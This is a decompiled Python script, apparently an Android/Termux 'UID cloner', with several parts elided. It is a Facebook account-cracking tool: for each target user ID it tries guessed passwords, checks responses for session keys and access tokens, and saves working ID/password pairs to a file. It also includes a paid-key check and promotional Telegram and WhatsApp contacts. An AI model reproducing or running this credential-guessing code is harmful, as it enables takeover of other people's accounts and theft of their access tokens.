# Decompile by Mr-NAZIM(Tools By Cobra-Linux Mr-NAZIM)
# Dont ader restiment with Nahid
# Decode file /- NA Cobra PYC 3.11
# DECODE FILE VERSION - V.3.1.1
# WHATSAPP - +8801908103929
import os
import time
os.system("clear")
print("  ==> \033[1;32mTHIS TOOLS DECODE BY (Mr-NAZIM-404) ")
time.sleep(5)
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Mr-NAZIM-404/FILE-CLONE/blob/main/Premium.txt"])
	exit(" [*] TELEGRAM : https://t.me/nazim1132 ")
...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN TELEGRAM >> https://t.me/nazim1132")
	runtxt("\033[0;95m    <===================☠️  \033[0;97mEXIT\033[0;95m ☠️===================> ")
	subprocess.check_output(["am", "start", "https://t.me/nazim1132"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Mr-NAZIM-404/FILE-CLONE/blob/main/Premium.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print("%s [%s•%s] %sTOOL NAME : %sMr-NAZIM"%(G,R,G,B,G))
		...
		runtxt("\n    \033[0;92m <=======    𝐌𝐫.𝐍𝐀𝐙𝐈𝐌 𝐔𝐈𝐃 𝐂𝐋𝐎𝐍𝐄𝐑    =======>  \033[0;97m ")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [BY] : %s/%s -> \033[0;92m [ Mr-NAZIM-OK:%s ]- \033[0;91m[Mr-NAZIM-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Mr-NAZIM-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [Mr-NAZIM-CP] %s | %s\033[0;97m         "%(uid, pw))
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print(" [*] Team      :  \n")
		print(" [ Sosial Medi  ] \n")
		print(" [*] Facebook  : https://facebook.com/nazim1132 ")
		print(" [*] Instagram : https://instagram.com/ ")
		print(" [*] YouTube   : https://youtube.com/ ")
		exit(" [*] GitHub    : https://github.com/Mr-NAZIM-404 ")
	else:
		Main()
